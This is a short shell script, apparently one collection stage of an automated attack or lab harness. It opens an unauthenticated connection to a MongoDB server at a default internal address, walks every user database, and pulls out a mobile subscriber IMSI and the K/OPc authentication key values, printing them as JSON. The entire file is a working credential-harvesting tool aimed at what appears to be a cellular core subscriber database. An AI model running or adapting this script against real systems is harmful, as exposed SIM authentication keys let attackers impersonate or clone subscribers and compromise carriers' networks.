#!/usr/bin/env sh
# subdb_dump (COLLECT): mongosh가 가능하면 IMSI/K·OPC 계열 값을 read-only로 수집.
# 실패/미가용 시 보수 기본 JSON 반환(파서 계약 유지).
set -eu

emit_default() {
  printf '%s\n' '{"artifacts":[],"values":{},"nonce_collision":null}'
}

if ! command -v mongosh >/dev/null 2>&1; then
  emit_default
  exit 0
fi

HOST="${MONGO_HOST:-10.44.0.2}"
PORT="${MONGO_PORT:-27017}"
TIMEOUT_S="${TIMEOUT_S:-6}"

JS='
const out = {artifacts:[], values:{}, nonce_collision:null};
try {
  const skip = new Set(["admin", "local", "config"]);
  const names = db.getMongo().getDBNames();
  for (const dbName of names) {
    if (skip.has(dbName)) continue;
    const d = db.getSiblingDB(dbName);
    for (const cName of d.getCollectionNames()) {
      const doc = d.getCollection(cName).findOne({});
      if (!doc) continue;
      if (out.values.imsi === undefined && doc.imsi != null) out.values.imsi = String(doc.imsi);
      if (out.values.k_opc === undefined) {
        if (doc.k_opc != null) out.values.k_opc = String(doc.k_opc);
        else if (doc.opc != null) out.values.k_opc = String(doc.opc);
        else if (doc.k != null) out.values.k_opc = String(doc.k);
      }
      if (out.values.imsi !== undefined && out.values.k_opc !== undefined) break;
    }
    if (out.values.imsi !== undefined && out.values.k_opc !== undefined) break;
  }
  if (out.values.k_opc !== undefined) out.artifacts.push("k_opc");
  if (out.values.imsi !== undefined) out.artifacts.push("imsi");
} catch (e) {}
print(JSON.stringify(out));
'

RES="$(timeout "$TIMEOUT_S" mongosh --quiet --host "$HOST" --port "$PORT" --eval "$JS" 2>/dev/null || true)"
if [ -n "${RES:-}" ]; then
  printf '%s\n' "$RES"
  exit 0
fi

emit_default
